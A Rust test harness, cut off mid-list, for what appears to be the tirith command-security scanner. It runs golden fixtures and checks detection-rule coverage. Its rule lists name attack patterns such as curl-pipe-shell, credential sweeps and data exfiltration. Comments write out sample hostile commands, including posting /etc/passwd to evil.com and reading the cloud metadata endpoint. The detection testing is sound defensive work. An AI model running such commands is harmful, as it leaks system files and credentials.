use serde::Deserialize;
use std::collections::HashSet;
use std::fs;
use std::path::PathBuf;

use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::Action;

#[derive(Debug, Deserialize)]
struct FixtureFile {
    fixture: Vec<Fixture>,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct Fixture {
    name: String,
    min_milestone: u8,
    input: String,
    context: String,
    #[serde(default = "default_shell")]
    shell: String,
    expected_action: String,
    expected_rules: Vec<String>,
    /// Rule IDs that MUST NOT appear in the verdict. Use this to pin
    /// double-fire boundaries — e.g. a fixture that should fire
    /// `pipe_to_interpreter` but must NOT also fire
    /// `ps_inline_download_execute`. The positive-only `expected_rules`
    /// list would silently accept both, which is a regression risk.
    #[serde(default)]
    forbidden_rules: Vec<String>,
    #[serde(default)]
    raw_bytes: Vec<u8>,
    /// File path for file-scan context fixtures.
    #[serde(default)]
    file_path: Option<String>,
}

fn default_shell() -> String {
    "posix".to_string()
}

fn fixtures_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .join("tests")
        .join("fixtures")
}

fn load_fixtures(filename: &str) -> Vec<Fixture> {
    let path = fixtures_dir().join(filename);
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read {}: {}", path.display(), e));
    let file: FixtureFile = toml::from_str(&content)
        .unwrap_or_else(|e| panic!("Failed to parse {}: {}", path.display(), e));
    file.fixture
}

fn run_fixture(fixture: &Fixture) {
    let shell = fixture
        .shell
        .parse::<ShellType>()
        .unwrap_or(ShellType::Posix);

    let scan_context = match fixture.context.as_str() {
        "exec" => ScanContext::Exec,
        "paste" => ScanContext::Paste,
        "file" => ScanContext::FileScan,
        _ => panic!("Unknown context: {}", fixture.context),
    };

    let raw_bytes = if !fixture.raw_bytes.is_empty() {
        Some(fixture.raw_bytes.clone())
    } else if scan_context == ScanContext::Paste || scan_context == ScanContext::FileScan {
        Some(fixture.input.as_bytes().to_vec())
    } else {
        None
    };

    let file_path = fixture.file_path.as_ref().map(std::path::PathBuf::from);

    let ctx = AnalysisContext {
        input: fixture.input.clone(),
        shell,
        scan_context,
        raw_bytes,
        interactive: true,
        cwd: None,
        file_path,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
    };

    let verdict = engine::analyze(&ctx);

    let expected_action = match fixture.expected_action.as_str() {
        "allow" => Action::Allow,
        "warn" => Action::Warn,
        "block" => Action::Block,
        other => panic!(
            "Unknown expected_action: {} in fixture {}",
            other, fixture.name
        ),
    };

    assert_eq!(
        verdict.action,
        expected_action,
        "Fixture '{}': expected {:?} but got {:?}. Findings: {:?}",
        fixture.name,
        expected_action,
        verdict.action,
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>()
    );

    // Build the found_rules list once for both positive and negative
    // assertions. A fixture can declare `forbidden_rules` without any
    // `expected_rules` (purely negative coverage), so compute up-front.
    let found_rules: Vec<String> = verdict
        .findings
        .iter()
        .map(|f| f.rule_id.to_string())
        .collect();

    for expected_rule in &fixture.expected_rules {
        assert!(
            found_rules.contains(expected_rule),
            "Fixture '{}': expected rule '{}' not found. Found rules: {:?}",
            fixture.name,
            expected_rule,
            found_rules
        );
    }

    for forbidden in &fixture.forbidden_rules {
        assert!(
            !found_rules.contains(forbidden),
            "Fixture '{}': forbidden rule '{}' was found in verdict. Findings: {:?}",
            fixture.name,
            forbidden,
            found_rules
        );
    }
}

#[test]
fn test_hostname_fixtures() {
    let fixtures = load_fixtures("hostname.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} hostname fixtures");
}

#[test]
fn test_path_fixtures() {
    let fixtures = load_fixtures("path.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} path fixtures");
}

#[test]
fn test_transport_fixtures() {
    let fixtures = load_fixtures("transport.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} transport fixtures");
}

#[test]
fn test_terminal_fixtures() {
    let fixtures = load_fixtures("terminal.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} terminal fixtures");
}

#[test]
fn test_command_fixtures() {
    let fixtures = load_fixtures("command.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} command fixtures");
}

#[test]
fn test_ecosystem_fixtures() {
    let fixtures = load_fixtures("ecosystem.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} ecosystem fixtures");
}

#[test]
fn test_environment_fixtures() {
    let fixtures = load_fixtures("environment.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} environment fixtures");
}

#[test]
fn test_clean_fixtures() {
    let fixtures = load_fixtures("clean.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} clean fixtures");
}

#[test]
fn test_shell_weirdness_fixtures() {
    let fixtures = load_fixtures("shell_weirdness.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} shell weirdness fixtures");
}

#[test]
fn test_configfile_fixtures() {
    let fixtures = load_fixtures("configfile.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} configfile fixtures");
}

#[test]
fn test_policy_fixtures() {
    let fixtures = load_fixtures("policy.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} policy fixtures");
}

/// Documented-behavior regression guard. Every fixture in
/// `tests/fixtures/documented_commands.toml` encodes a behavioral contract
/// already promised to users in the README or TIRITH.md. A refactor that
/// silently breaks one of those contracts fails here.
#[test]
fn test_documented_commands_fixtures() {
    let fixtures = load_fixtures("documented_commands.toml");
    let count = fixtures.len();
    assert!(
        count > 0,
        "documented_commands.toml is the project's doc-contract guard — must never be empty"
    );
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} documented-command fixtures");
}

#[test]
fn test_rendered_fixtures() {
    let fixtures = load_fixtures("rendered.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} rendered fixtures");
}

#[test]
fn test_credential_fixtures() {
    let fixtures = load_fixtures("credential.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} credential fixtures");
}

#[test]
fn test_codefile_fixtures() {
    let fixtures = load_fixtures("codefile.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} codefile fixtures");
}

#[test]
fn test_cifile_fixtures() {
    let fixtures = load_fixtures("cifile.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} cifile fixtures");
}

#[test]
fn test_aifile_fixtures() {
    let fixtures = load_fixtures("aifile.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} aifile fixtures");
}

#[test]
fn test_threatintel_fixtures() {
    // Point the threat DB cache at the test fixture DB so that DB-dependent
    // rules (threat_malicious_package, threat_malicious_ip, etc.) can fire.
    let test_db_path = fixtures_dir().join("test-threatdb.dat");
    assert!(
        test_db_path.exists(),
        "Test threat DB not found at {}. Run: cargo test -p tirith-core --test generate_test_fixtures -- --ignored",
        test_db_path.display()
    );
    std::env::set_var("TIRITH_THREATDB_PATH", &test_db_path);
    tirith_core::threatdb::ThreatDb::refresh_cache();

    let fixtures = load_fixtures("threatintel.toml");
    let count = fixtures.len();
    for fixture in &fixtures {
        run_fixture(fixture);
    }
    eprintln!("Passed {count} threatintel fixtures");

    std::env::remove_var("TIRITH_THREATDB_PATH");
    tirith_core::threatdb::ThreatDb::refresh_cache();
}

/// Verify total fixture count across all files.
#[test]
fn test_fixture_count() {
    let files = [
        "hostname.toml",
        "path.toml",
        "transport.toml",
        "terminal.toml",
        "command.toml",
        "ecosystem.toml",
        "environment.toml",
        "clean.toml",
        "shell_weirdness.toml",
        "policy.toml",
        "configfile.toml",
        "rendered.toml",
        "credential.toml",
        "codefile.toml",
        "threatintel.toml",
    ];

    let total: usize = files.iter().map(|f| load_fixtures(f).len()).sum();
    eprintln!("Total golden fixtures: {total}");
    assert!(
        total >= 200,
        "Expected at least 200 golden fixtures, found {total}"
    );
}

/// Verify Tier 1 regex catches all rule-triggering fixtures.
#[test]
fn test_tier1_coverage() {
    let files = [
        "hostname.toml",
        "path.toml",
        "transport.toml",
        "terminal.toml",
        "command.toml",
        "ecosystem.toml",
        "credential.toml",
    ];

    let mut missed = Vec::new();

    for filename in &files {
        let fixtures = load_fixtures(filename);
        for fixture in &fixtures {
            if fixture.expected_action == "allow" && fixture.expected_rules.is_empty() {
                continue;
            }
            let scan_context = match fixture.context.as_str() {
                "exec" => ScanContext::Exec,
                "paste" => ScanContext::Paste,
                _ => continue,
            };

            // Paste context: byte scan catches bidi/zero-width/etc. directly,
            // bypassing the tier-1 regex.
            if scan_context == ScanContext::Paste {
                let bytes = if !fixture.raw_bytes.is_empty() {
                    &fixture.raw_bytes
                } else {
                    fixture.input.as_bytes()
                };
                let byte_scan = tirith_core::extract::scan_bytes(bytes);
                let byte_triggered = byte_scan.has_ansi_escapes
                    || byte_scan.has_control_chars
                    || byte_scan.has_bidi_controls
                    || byte_scan.has_zero_width
                    || byte_scan.has_invalid_utf8
                    || byte_scan.has_unicode_tags
                    || byte_scan.has_variation_selectors
                    || byte_scan.has_invisible_math_operators
                    || byte_scan.has_invisible_whitespace
                    || byte_scan.has_hangul_fillers
                    || byte_scan.has_confusable_text;

                if byte_triggered {
                    continue;
                }
            }

            // Exec context: byte scan for bidi/zero-width/etc. bypasses the
            // tier-1 regex via the exec_bidi_triggered path in engine.rs.
            if scan_context == ScanContext::Exec {
                let byte_scan = tirith_core::extract::scan_bytes(fixture.input.as_bytes());
                if byte_scan.has_bidi_controls
                    || byte_scan.has_zero_width
                    || byte_scan.has_unicode_tags
                    || byte_scan.has_variation_selectors
                    || byte_scan.has_invisible_math_operators
                    || byte_scan.has_invisible_whitespace
                    || byte_scan.has_hangul_fillers
                    || byte_scan.has_confusable_text
                {
                    continue;
                }
            }

            let regex_triggered = tirith_core::extract::tier1_scan(&fixture.input, scan_context);

            if !regex_triggered {
                missed.push(format!(
                    "{}:{} (expected {})",
                    filename, fixture.name, fixture.expected_action
                ));
            }
        }
    }

    if !missed.is_empty() {
        panic!(
            "Tier 1 regex missed {} fixtures (security bug!):\n  {}",
            missed.len(),
            missed.join("\n  ")
        );
    }
}

const ALL_FIXTURE_FILES: &[&str] = &[
    "hostname.toml",
    "path.toml",
    "transport.toml",
    "terminal.toml",
    "command.toml",
    "ecosystem.toml",
    "environment.toml",
    "clean.toml",
    "shell_weirdness.toml",
    "policy.toml",
    "configfile.toml",
    "rendered.toml",
    "credential.toml",
    "codefile.toml",
    "cifile.toml",
    "aifile.toml",
    "threatintel.toml",
];

/// Output-direction fixture files. NOT in `ALL_FIXTURE_FILES` — those drive
/// `engine::analyze`, whereas output fixtures need `engine::analyze_output`.
const OUTPUT_FIXTURE_FILES: &[&str] = &["output.toml"];

/// Complete list of all RuleId variants (snake_case serialized form).
/// MAINTENANCE: when adding a new RuleId variant, add it here too — the test
/// will fail if a variant is missing, catching the omission.
const ALL_RULE_IDS: &[&str] = &[
    // Hostname
    "non_ascii_hostname",
    "punycode_domain",
    "mixed_script_in_label",
    "userinfo_trick",
    "confusable_domain",
    "raw_ip_url",
    "non_standard_port",
    "invalid_host_chars",
    "trailing_dot_whitespace",
    "lookalike_tld",
    // Path
    "non_ascii_path",
    "homoglyph_in_path",
    "double_encoding",
    // Transport
    "plain_http_to_sink",
    "schemeless_to_sink",
    "insecure_tls_flags",
    "shortened_url",
    // Terminal deception
    "ansi_escapes",
    "control_chars",
    "bidi_controls",
    "zero_width_chars",
    "hidden_multiline",
    "unicode_tags",
    "invisible_math_operator",
    "variation_selector",
    "invisible_whitespace",
    "hangul_filler",
    "confusable_text",
    // Command shape
    "pipe_to_interpreter",
    "curl_pipe_shell",
    "wget_pipe_shell",
    "httpie_pipe_shell",
    "xh_pipe_shell",
    "dotfile_overwrite",
    "archive_extract",
    "proc_mem_access",
    "docker_remote_priv_esc",
    "credential_file_sweep",
    "base64_decode_execute",
    "data_exfiltration",
    "ps_set_execution_policy_bypass",
    "ps_defender_exclusion",
    "ps_inline_download_execute",
    // Code file scan
    "dynamic_code_execution",
    "obfuscated_payload",
    "suspicious_code_exfiltration",
    // Environment
    "proxy_env_set",
    "sensitive_env_export",
    "code_injection_env",
    "interpreter_hijack_env",
    "shell_injection_env",
    // Network destination
    "metadata_endpoint",
    "private_network_access",
    "command_network_deny",
    // Config file
    "config_injection",
    "config_suspicious_indicator",
    "config_malformed",
    "config_non_ascii",
    "config_invisible_unicode",
    "mcp_insecure_server",
    "mcp_untrusted_server",
    "mcp_duplicate_server_name",
    "mcp_overly_permissive",
    "mcp_suspicious_args",
    "mcp_server_drift",
    // Ecosystem
    "git_typosquat",
    "docker_untrusted_registry",
    "pip_url_install",
    "npm_url_install",
    "web3_rpc_endpoint",
    "web3_address_in_url",
    "vet_not_configured",
    // Install-command rules
    "repo_add_from_pipe",
    "unsigned_repo_trust",
    "gpg_check_disabled",
    "kubectl_apply_remote",
    "helm_untrusted_repo",
    "terraform_remote_module",
    "brew_untrusted_tap",
    // CI / repo supply-chain scan rules
    "workflow_unpinned_action",
    "workflow_dangerous_trigger",
    "workflow_curl_pipe_shell",
    "workflow_untrusted_input",
    "dockerfile_unpinned_image",
    "package_script_dangerous",
    // AI-relevant file hidden-content scan rules
    "notebook_hidden_content",
    "notebook_suspicious_output",
    "agent_instruction_hidden",
    "svg_script_embedded",
    "svg_external_reference",
    // Threat intelligence — local DB
    "threat_malicious_package",
    "threat_malicious_ip",
    "threat_package_typosquat",
    "threat_package_similar_name",
    // Threat intelligence — supplemental feeds
    "threat_malicious_url",
    "threat_phishing_url",
    "threat_tor_exit_node",
    "threat_threat_fox_ioc",
    // Threat intelligence — real-time lookups
    "threat_osv_vulnerable",
    "threat_cisa_kev",
    "threat_suspicious_package",
    "threat_safe_browsing",
    // Package reputation rules (M6 ch6)
    "package_not_found_in_registry",
    "package_maintainer_change_recent",
    "package_ownership_transferred",
    "package_osv_advisory_active",
    "package_dependency_confusion",
    "package_install_script_network_call",
    "package_repo_mismatch",
    // Package-policy gated rules (M6 ch7)
    "package_policy_newer_than_days",
    "package_policy_low_downloads",
    "package_policy_typosquat_distance",
    "package_policy_unknown_package_with_install_scripts",
    "package_policy_not_found",
    // Rendered content
    "hidden_css_content",
    "hidden_color_content",
    "hidden_html_attribute",
    "markdown_comment",
    "html_comment",
    // Credential
    "credential_in_text",
    "high_entropy_secret",
    "private_key_exposed",
    // Cloaking
    "server_cloaking",
    // Clipboard
    "clipboard_hidden",
    // PDF
    "pdf_hidden_text",
    // Policy
    "policy_blocklisted",
    "agent_denied_by_policy",
    // Custom rules
    "custom_rule_match",
    // License/infrastructure
    "license_required",
    // Output-direction rules (M7 ch1)
    "output_osc52_clipboard_write",
    "output_hidden_text",
    "output_fake_prompt",
    "output_terminal_hyperlink_mismatch",
    "output_title_manipulation",
    "output_clear_screen",
];

/// Collect all expected_rules from all fixture files into a set.
fn collect_fixture_rules() -> HashSet<String> {
    let mut covered = HashSet::new();
    for file in ALL_FIXTURE_FILES {
        for fixture in load_fixtures(file) {
            for rule in &fixture.expected_rules {
                covered.insert(rule.clone());
            }
        }
    }
    covered
}

/// Collect all fixtures from all files.
fn load_all_fixtures() -> Vec<(String, Fixture)> {
    let mut all = Vec::new();
    for file in ALL_FIXTURE_FILES {
        for fixture in load_fixtures(file) {
            all.push((file.to_string(), fixture));
        }
    }
    all
}

/// Rules that depend on runtime state and cannot be tested via static fixtures.
/// - proxy_env_set: requires HTTP_PROXY/HTTPS_PROXY env vars to be set
/// - policy_blocklisted: requires a blocklist file in policy config
/// - agent_denied_by_policy: requires an `agent_rules.deny` matcher in policy
///   (M4 item 8 chunk 3 — covered by dedicated tests in
///   `crates/tirith-core/src/policy.rs` and
///   `crates/tirith-core/src/escalation.rs`)
/// - license_required: emitted by license infrastructure, not detection rules
const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
    "proxy_env_set",
    "policy_blocklisted",
    "agent_denied_by_policy",
    "command_network_deny",
    "license_required",
    "custom_rule_match",  // requires custom_rules in policy (Team-only)
    "server_cloaking",    // requires network fetch (Unix-only)
    "clipboard_hidden",   // requires --html clipboard input
    "pdf_hidden_text",    // requires .pdf file input
    "config_malformed",   // requires MCP config filename context in file scan
    "vet_not_configured", // requires cargo install without cargo-vet
    // Local-DB threat rules are covered by test-threatdb.dat in
    // test_threatintel_fixtures. The rules below still depend on optional
    // feeds or live APIs.
    "threat_malicious_url",      // requires supplemental URLhaus data
    "threat_phishing_url",       // requires supplemental phishing feeds
    "threat_tor_exit_node",      // requires supplemental Tor exit-node data
    "threat_threat_fox_ioc",     // requires supplemental ThreatFox data
    "threat_osv_vulnerable",     // requires live OSV.dev lookups
    "threat_cisa_kev",           // requires live CISA KEV correlation
    "threat_suspicious_package", // requires live package-health lookups
    "threat_safe_browsing",      // requires a Google Safe Browsing API key
    // M6 ch6 — package reputation rules emitted by package_risk /
    // install_txn / ecosystem_scan paths, NOT by the engine. They require
    // an `--online` registry-API run (or a recorded snapshot store) that
    // static engine fixtures cannot produce; covered by unit tests in
    // their own modules plus the ecosystem-fixture rows that document the
    // signal shape.
    "package_not_found_in_registry",
    "package_maintainer_change_recent",
    "package_ownership_transferred",
    "package_osv_advisory_active",
    "package_dependency_confusion",
    "package_install_script_network_call",
    "package_repo_mismatch",
    // M6 ch7 — policy-gated rules emitted by install_txn / ecosystem_scan
    // paths, NOT by the engine. They require an `--online` registry-API
    // signal AND a policy that crosses the configured threshold; static
    // engine fixtures cannot drive both at once. Covered by ecosystem.toml
    // rows that document the offline (no-fire) behavior plus dedicated unit
    // tests in install_txn / ecosystem_scan.
    "package_policy_newer_than_days",
    "package_policy_low_downloads",
    "package_policy_typosquat_distance",
    "package_policy_unknown_package_with_install_scripts",
    "package_policy_not_found",
    // M7 ch1 — output-direction rules fire from `engine::analyze_output`,
    // NOT the `engine::analyze` pipeline that the golden-fixture runner
    // drives. They are covered by `tests/fixtures/output.toml` via a
    // dedicated test (`test_output_fixtures`) below and by per-rule unit
    // tests in `rules/output.rs` and `extract.rs::output_scan_tests`.
    "output_osc52_clipboard_write",
    "output_hidden_text",
    "output_fake_prompt",
    "output_terminal_hyperlink_mismatch",
    "output_title_manipulation",
    "output_clear_screen",
];

/// Collect expected_rules across the output-direction fixture files.
fn collect_output_fixture_rules() -> HashSet<String> {
    let mut covered = HashSet::new();
    for file in OUTPUT_FIXTURE_FILES {
        for fixture in load_fixtures(file) {
            for rule in &fixture.expected_rules {
                covered.insert(rule.clone());
            }
        }
    }
    covered
}

/// Drive the output-direction rule pipeline against the dedicated fixture
/// files. This is the analogue of [`test_hostname_fixtures`] etc. for the
/// `engine::analyze_output` sibling pipeline.
#[test]
fn test_output_fixtures() {
    use tirith_core::engine::{analyze_output, OutputContext};

    for file in OUTPUT_FIXTURE_FILES {
        let fixtures = load_fixtures(file);
        let count = fixtures.len();
        for fixture in &fixtures {
            let verdict = analyze_output(&fixture.input, OutputContext::default());
            let expected = match fixture.expected_action.as_str() {
                "allow" => Action::Allow,
                "warn" => Action::Warn,
                "block" => Action::Block,
                other => panic!(
                    "Unknown expected_action '{}' in output fixture {}",
                    other, fixture.name
                ),
            };
            assert_eq!(
                verdict.action,
                expected,
                "output fixture '{}': expected {:?} got {:?}; findings = {:?}",
                fixture.name,
                expected,
                verdict.action,
                verdict
                    .findings
                    .iter()
                    .map(|f| format!("{}: {}", f.rule_id, f.title))
                    .collect::<Vec<_>>()
            );

            let found_rules: Vec<String> = verdict
                .findings
                .iter()
                .map(|f| f.rule_id.to_string())
                .collect();
            for expected_rule in &fixture.expected_rules {
                assert!(
                    found_rules.contains(expected_rule),
                    "output fixture '{}': expected rule '{}' not found. Found: {:?}",
                    fixture.name,
                    expected_rule,
                    found_rules
                );
            }
            for forbidden in &fixture.forbidden_rules {
                assert!(
                    !found_rules.contains(forbidden),
                    "output fixture '{}': forbidden rule '{}' was found. Findings: {:?}",
                    fixture.name,
                    forbidden,
                    found_rules
                );
            }
        }
        eprintln!("Passed {count} output fixtures ({file})");
    }
}

/// Sibling of `test_all_rule_ids_have_fixture_coverage` that pins coverage
/// for the 6 output-direction rules against the `output.toml` fixtures.
#[test]
fn test_output_rule_ids_have_fixture_coverage() {
    let covered = collect_output_fixture_rules();
    let required = [
        "output_osc52_clipboard_write",
        "output_hidden_text",
        "output_fake_prompt",
        "output_terminal_hyperlink_mismatch",
        "output_title_manipulation",
        "output_clear_screen",
    ];
    let missing: Vec<&str> = required
        .iter()
        .copied()
        .filter(|r| !covered.contains(*r))
        .collect();
    assert!(
        missing.is_empty(),
        "Output-direction rules missing fixture coverage in tests/fixtures/output.toml:\n{}",
        missing
            .iter()
            .map(|r| format!("  - {r}"))
            .collect::<Vec<_>>()
            .join("\n")
    );
}

#[test]
fn test_all_rule_ids_have_fixture_coverage() {
    let covered = collect_fixture_rules();
    let excluded: HashSet<&str> = EXTERNALLY_TRIGGERED_RULES.iter().copied().collect();

    let missing: Vec<&&str> = ALL_RULE_IDS
        .iter()
        .filter(|id| !excluded.contains(**id))
        .filter(|id| !covered.contains(**id))
        .collect();

    assert!(
        missing.is_empty(),
        "RuleId variants with NO golden fixture coverage (add at least one fixture per rule):\n{}",
        missing
            .iter()
            .map(|id| format!("  - {id}"))
            .collect::<Vec<_>>()
            .join("\n")
    );
}

/// Verify ALL_RULE_IDS stays in sync with the actual RuleId enum.
/// Serializes every known variant and checks it appears in the list.
#[test]
fn test_rule_id_list_is_complete() {
    use tirith_core::verdict::RuleId;

    // Exhaustive list — if a new variant is added to the enum, this
    // match will fail to compile, forcing the developer to add it here.
    let all_variants: Vec<RuleId> = vec![
        RuleId::NonAsciiHostname,
        RuleId::PunycodeDomain,
        RuleId::MixedScriptInLabel,
        RuleId::UserinfoTrick,
        RuleId::ConfusableDomain,
        RuleId::RawIpUrl,
        RuleId::NonStandardPort,
        RuleId::InvalidHostChars,
        RuleId::TrailingDotWhitespace,
        RuleId::LookalikeTld,
        RuleId::NonAsciiPath,
        RuleId::HomoglyphInPath,
        RuleId::DoubleEncoding,
        RuleId::PlainHttpToSink,
        RuleId::SchemelessToSink,
        RuleId::InsecureTlsFlags,
        RuleId::ShortenedUrl,
        RuleId::AnsiEscapes,
        RuleId::ControlChars,
        RuleId::BidiControls,
        RuleId::ZeroWidthChars,
        RuleId::HiddenMultiline,
        RuleId::UnicodeTags,
        RuleId::InvisibleMathOperator,
        RuleId::VariationSelector,
        RuleId::InvisibleWhitespace,
        RuleId::HangulFiller,
        RuleId::ConfusableText,
        RuleId::PipeToInterpreter,
        RuleId::CurlPipeShell,
        RuleId::WgetPipeShell,
        RuleId::HttpiePipeShell,
        RuleId::XhPipeShell,
        RuleId::DotfileOverwrite,
        RuleId::ArchiveExtract,
        RuleId::ProcMemAccess,
        RuleId::DockerRemotePrivEsc,
        RuleId::CredentialFileSweep,
        RuleId::Base64DecodeExecute,
        RuleId::DataExfiltration,
        RuleId::PsSetExecutionPolicyBypass,
        RuleId::PsDefenderExclusion,
        RuleId::PsInlineDownloadExecute,
        RuleId::DynamicCodeExecution,
        RuleId::ObfuscatedPayload,
        RuleId::SuspiciousCodeExfiltration,
        RuleId::ProxyEnvSet,
        RuleId::SensitiveEnvExport,
        RuleId::CodeInjectionEnv,
        RuleId::InterpreterHijackEnv,
        RuleId::ShellInjectionEnv,
        RuleId::MetadataEndpoint,
        RuleId::PrivateNetworkAccess,
        RuleId::CommandNetworkDeny,
        RuleId::ConfigInjection,
        RuleId::ConfigSuspiciousIndicator,
        RuleId::ConfigMalformed,
        RuleId::ConfigNonAscii,
        RuleId::ConfigInvisibleUnicode,
        RuleId::McpInsecureServer,
        RuleId::McpUntrustedServer,
        RuleId::McpDuplicateServerName,
        RuleId::McpOverlyPermissive,
        RuleId::McpSuspiciousArgs,
        RuleId::McpServerDrift,
        RuleId::GitTyposquat,
        RuleId::DockerUntrustedRegistry,
        RuleId::PipUrlInstall,
        RuleId::NpmUrlInstall,
        RuleId::Web3RpcEndpoint,
        RuleId::Web3AddressInUrl,
        RuleId::VetNotConfigured,
        // Install-command rules
        RuleId::RepoAddFromPipe,
        RuleId::UnsignedRepoTrust,
        RuleId::GpgCheckDisabled,
        RuleId::KubectlApplyRemote,
        RuleId::HelmUntrustedRepo,
        RuleId::TerraformRemoteModule,
        RuleId::BrewUntrustedTap,
        // CI / repo supply-chain scan rules
        RuleId::WorkflowUnpinnedAction,
        RuleId::WorkflowDangerousTrigger,
        RuleId::WorkflowCurlPipeShell,
        RuleId::WorkflowUntrustedInput,
        RuleId::DockerfileUnpinnedImage,
        RuleId::PackageScriptDangerous,
        // AI-relevant file hidden-content scan rules
        RuleId::NotebookHiddenContent,
        RuleId::NotebookSuspiciousOutput,
        RuleId::AgentInstructionHidden,
        RuleId::SvgScriptEmbedded,
        RuleId::SvgExternalReference,
        // Threat intelligence — local DB
        RuleId::ThreatMaliciousPackage,
        RuleId::ThreatMaliciousIp,
        RuleId::ThreatPackageTyposquat,
        RuleId::ThreatPackageSimilarName,
        // Threat intelligence — supplemental feeds
        RuleId::ThreatMaliciousUrl,
        RuleId::ThreatPhishingUrl,
        RuleId::ThreatTorExitNode,
        RuleId::ThreatThreatFoxIoc,
        // Threat intelligence — real-time lookups
        RuleId::ThreatOsvVulnerable,
        RuleId::ThreatCisaKev,
        RuleId::ThreatSuspiciousPackage,
        RuleId::ThreatSafeBrowsing,
        // Package reputation rules (M6 ch6)
        RuleId::PackageNotFoundInRegistry,
        RuleId::PackageMaintainerChangeRecent,
        RuleId::PackageOwnershipTransferred,
        RuleId::PackageOsvAdvisoryActive,
        RuleId::PackageDependencyConfusion,
        RuleId::PackageInstallScriptNetworkCall,
        RuleId::PackageRepoMismatch,
        // Package-policy gated rules (M6 ch7)
        RuleId::PackagePolicyNewerThanDays,
        RuleId::PackagePolicyLowDownloads,
        RuleId::PackagePolicyTyposquatDistance,
        RuleId::PackagePolicyUnknownPackageWithInstallScripts,
        RuleId::PackagePolicyNotFound,
        RuleId::HiddenCssContent,
        RuleId::HiddenColorContent,
        RuleId::HiddenHtmlAttribute,
        RuleId::MarkdownComment,
        RuleId::HtmlComment,
        RuleId::CredentialInText,
        RuleId::HighEntropySecret,
        RuleId::PrivateKeyExposed,
        RuleId::ServerCloaking,
        RuleId::ClipboardHidden,
        RuleId::PdfHiddenText,
        RuleId::CustomRuleMatch,
        RuleId::PolicyBlocklisted,
        RuleId::AgentDeniedByPolicy,
        RuleId::LicenseRequired,
        // Output-direction rules (M7 ch1)
        RuleId::OutputOsc52ClipboardWrite,
        RuleId::OutputHiddenText,
        RuleId::OutputFakePrompt,
        RuleId::OutputTerminalHyperlinkMismatch,
        RuleId::OutputTitleManipulation,
        RuleId::OutputClearScreen,
    ];

    let all_rule_set: HashSet<&str> = ALL_RULE_IDS.iter().copied().collect();

    for variant in &all_variants {
        let serialized = variant.to_string();
        assert!(
            all_rule_set.contains(serialized.as_str()),
            "RuleId::{variant:?} serializes to '{serialized}' but is missing from ALL_RULE_IDS constant"
        );
    }

    // Also check counts match (catches stale entries in ALL_RULE_IDS)
    assert_eq!(
        all_variants.len(),
        ALL_RULE_IDS.len(),
        "ALL_RULE_IDS has {} entries but RuleId enum has {} variants",
        ALL_RULE_IDS.len(),
        all_variants.len()
    );
}

#[test]
fn test_no_url_rules_have_no_url_fixtures() {
    // Rules that CAN fire when the input has no URL at all.
    // These need their own tier-1 pattern (not just :// or git@).
    let no_url_rules: HashSet<&str> = [
        "dotfile_overwrite",
        "archive_extract",
        "pipe_to_interpreter",          // cat script | bash
        "bidi_controls",                // exec context, no URL needed
        "zero_width_chars",             // exec context, no URL needed
        "unicode_tags",                 // byte-level, no URL needed
        "invisible_math_operator",      // byte-level, no URL needed
        "invisible_whitespace",         // byte-level, no URL needed
        "proc_mem_access",              // /proc/*/mem access, no URL needed
        "credential_file_sweep",        // multi-credential file access, no URL needed
        "code_injection_env",           // export LD_PRELOAD=, no URL needed
        "shell_injection_env",          // export BASH_ENV=, no URL needed
        "interpreter_hijack_env",       // export PYTHONPATH=, no URL needed
        "sensitive_env_export",         // export OPENAI_API_KEY=, no URL needed
        "config_injection",             // file context, no URL needed
        "config_non_ascii",             // file context, no URL needed
        "config_invisible_unicode",     // file context, no URL needed
        "mcp_suspicious_args",          // file context, no URL needed
        "mcp_overly_permissive",        // file context, no URL needed
        "mcp_duplicate_server_name",    // file context, no URL needed
        "mcp_server_drift",             // mcp.lock FileScan, no URL needed
        "metadata_endpoint",            // bare IP: curl 169.254.169.254/path
        "private_network_access",       // bare IP: curl 10.0.0.1/path
        "credential_in_text",           // token/key in text, no URL needed
        "high_entropy_secret",          // high-entropy secret assignment, no URL needed
        "private_key_exposed",          // PEM key block, no URL needed
        "base64_decode_execute",        // base64 decode chain, no URL needed
        "data_exfiltration",            // curl -d @/etc/passwd evil.com, schemeless
